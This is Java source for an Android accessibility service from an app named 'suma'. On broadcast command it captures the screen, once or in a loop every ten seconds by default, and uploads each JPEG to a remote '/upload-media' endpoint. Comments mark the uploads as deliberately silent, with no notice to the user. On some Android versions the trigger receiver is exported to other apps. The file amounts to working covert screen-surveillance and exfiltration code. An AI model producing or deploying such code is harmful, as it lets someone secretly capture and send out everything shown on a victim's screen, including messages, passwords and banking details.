package com.example.suma;

import android.accessibilityservice.AccessibilityService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.os.Build;
import android.util.Log;
import android.view.Display;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;
import android.os.Handler;
import android.os.Looper;

import androidx.annotation.NonNull;

import java.io.File;
import java.io.FileOutputStream;
import java.util.concurrent.Executor;

public class GlobalActionService extends AccessibilityService {

    private static final String TAG = "SumaAccessibility";
    public static final String ACTION_SCREENSHOT = "com.example.suma.ACTION_SCREENSHOT";
    public static final String ACTION_START_SCREENSHOT_LOOP = "com.example.suma.ACTION_START_SCREENSHOT_LOOP";
    public static final String ACTION_STOP_SCREENSHOT_LOOP = "com.example.suma.ACTION_STOP_SCREENSHOT_LOOP";

    private Handler loopHandler = new Handler(Looper.getMainLooper());
    private Runnable loopRunnable;
    private boolean isLooping = false;
    private long loopInterval = 10000;

    private BroadcastReceiver screenshotReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (ACTION_SCREENSHOT.equals(action)) {
                Log.d(TAG, "Received screenshot request via Broadcast");
                performGlobalScreenshot();
            } else if (ACTION_START_SCREENSHOT_LOOP.equals(action)) {
                long interval = intent.getLongExtra("interval", 10000);
                startScreenshotLoop(interval);
            } else if (ACTION_STOP_SCREENSHOT_LOOP.equals(action)) {
                stopScreenshotLoop();
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "GlobalActionService CREATE");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "GlobalActionService COMPONENT CONNECTED");

        try {
            IntentFilter filter = new IntentFilter();
            filter.addAction(ACTION_SCREENSHOT);
            filter.addAction(ACTION_START_SCREENSHOT_LOOP);
            filter.addAction(ACTION_STOP_SCREENSHOT_LOOP);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                // Secure default: NOT_EXPORTED
                registerReceiver(screenshotReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                registerReceiver(screenshotReceiver, filter, Context.RECEIVER_EXPORTED);
            } else {
                registerReceiver(screenshotReceiver, filter);
            }
            Log.d(TAG, "Receiver Registered Successfully");
        } catch (Exception e) {
            Log.e(TAG, "Failed to register receiver: " + e.getMessage());
            e.printStackTrace();
        }
    }

    @Override
    public boolean onUnbind(Intent intent) {
        stopScreenshotLoop();
        try {
            unregisterReceiver(screenshotReceiver);
        } catch (Exception e) {
            // Receiver might not be registered
        }
        return super.onUnbind(intent);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Not used, but required to override
    }

    @Override
    public void onInterrupt() {
        // Not used
    }

    private void performGlobalScreenshot() {
        if (Build.VERSION.SDK_INT >= 30) {
            takeScreenshot(Display.DEFAULT_DISPLAY, new Executor() {
                @Override
                public void execute(Runnable command) {
                    command.run();
                }
            }, new TakeScreenshotCallback() {
                @Override
                public void onSuccess(@NonNull ScreenshotResult screenshotResult) {
                    Log.d(TAG, "Screenshot Taken Successfully");
                    Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshotResult.getHardwareBuffer(),
                            screenshotResult.getColorSpace());
                    if (bitmap != null) {
                        // We need a copy because HardwareBuffer might be closed
                        Bitmap copy = bitmap.copy(Bitmap.Config.ARGB_8888, false);
                        bitmap.recycle();
                        screenshotResult.getHardwareBuffer().close();
                        saveAndUpload(copy);
                    }
                }

                @Override
                public void onFailure(@NonNull int errorCode) {
                    Log.e(TAG, "Screenshot Failed: " + errorCode);
                }
            });
        } else {
            // Fallback for Global Action (Take Screenshot) - API 28+
            performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);
        }
    }

    private void saveAndUpload(Bitmap bitmap) {
        try {
            File file = new File(getCacheDir(), "screenshot_" + System.currentTimeMillis() + ".jpg");
            FileOutputStream fos = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, fos);
            fos.flush();
            fos.close();

            Log.d(TAG, "Screenshot saved to: " + file.getAbsolutePath());

            // Use AuthManager to get the correct token and URL
            String authToken = AuthManager.getToken(this);
            String baseUrl = AuthManager.getBaseUrl();

            if (authToken != null) {
                NetworkUtils.uploadFile(baseUrl + "/upload-media", file, authToken,
                        new NetworkUtils.Callback() {
                            @Override
                            public void onSuccess(String response) {
                                Log.d(TAG, "Upload Success: " + response);
                                file.delete();
                                // Silent: No Toast
                            }

                            @Override
                            public void onError(String error) {
                                Log.e(TAG, "Upload Failed: " + error);
                                // Silent: No Toast
                            }
                        });
            } else {
                Log.e(TAG, "Auth Token is null, cannot upload.");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startScreenshotLoop(long interval) {
        Log.d(TAG, "Starting Screenshot Loop. Interval: " + interval + "ms");
        if (isLooping)
            stopScreenshotLoop();

        isLooping = true;
        loopInterval = interval;
        loopRunnable = new Runnable() {
            @Override
            public void run() {
                if (!isLooping)
                    return;
                Log.d(TAG, "Loop: Taking Screenshot...");
                performGlobalScreenshot();
                loopHandler.postDelayed(this, loopInterval);
            }
        };
        // Start immediately
        loopHandler.post(loopRunnable);
    }

    private void stopScreenshotLoop() {
        Log.d(TAG, "Stopping Screenshot Loop");
        isLooping = false;
        if (loopRunnable != null) {
            loopHandler.removeCallbacks(loopRunnable);
            loopRunnable = null;
        }
    }
}
